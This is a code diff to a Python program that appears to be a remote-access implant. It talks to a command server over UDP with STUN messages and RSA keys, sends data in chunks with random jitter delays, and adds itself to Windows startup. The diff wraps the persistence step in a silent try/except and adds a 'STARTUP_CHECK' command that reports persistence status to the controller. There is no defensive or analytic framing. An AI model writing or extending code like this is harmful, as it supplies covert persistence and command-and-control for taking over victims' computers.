@@ -5,6 +5,7 @@ from stun import build_stun_message
 import socket, time, random, base64, struct, subprocess, gc, rsa, threading
 from add_to_startup import add_to_windows_startup
 from check_missing import check_missing_packets
+import platform
 my_priv_key = None
 my_pub_key = None
 target_pub_key = None
@@ -27,12 +28,7 @@ def parse_public_key(text: str):
         return key
     except:
         return None
-
-if IS_ADDED_TO_STARTUP == False:
-    if platform.system() == "Windows":
-        if add_to_windows_startup() == 200:
-            IS_ADDED_TO_STARTUP = True
-
+    
 def send_msg(message, is_cached: bool):
     if type(message) is not str:
         message = str(message)
@@ -49,11 +45,18 @@ def send_msg(message, is_cached: bool):
                 i+=1
             jitter_delay = 0.3 + random.uniform(-0.3, 0.3)
             time.sleep(jitter_delay)
-            sock.sendto(chunk, SERVER)
-                
-        
+            sock.sendto(chunk, SERVER)  
     except:
         return
+
+if IS_ADDED_TO_STARTUP == False:
+    if platform.system() == "Windows":
+        try:
+            if add_to_windows_startup() == 200:
+                IS_ADDED_TO_STARTUP = True
+        except:
+            pass
+
 
 
 def timeout_checker():
@@ -174,8 +177,17 @@ def core():
                             continue
 
                         full_command = full_command["message"]
-                        
-                        if full_command.startswith("target_chunk"):
+                        print(full_command)
+                        if full_command.startswith("STARTUP_CHECK"):
+                            last_received_time = None
+                            resends_requests = 0
+                            status = "True" if IS_ADDED_TO_STARTUP == True else "False"
+                            send_msg(f"Startup Satus => {status}", False)
+                            received_chunks = {}
+                            expected_chunks = None
+                            gc.collect()
+                            continue
+                        elif full_command.startswith("target_chunk"):
                             last_received_time = None
                             resends_requests = 0
                             cmd, chunk_size = full_command.split()
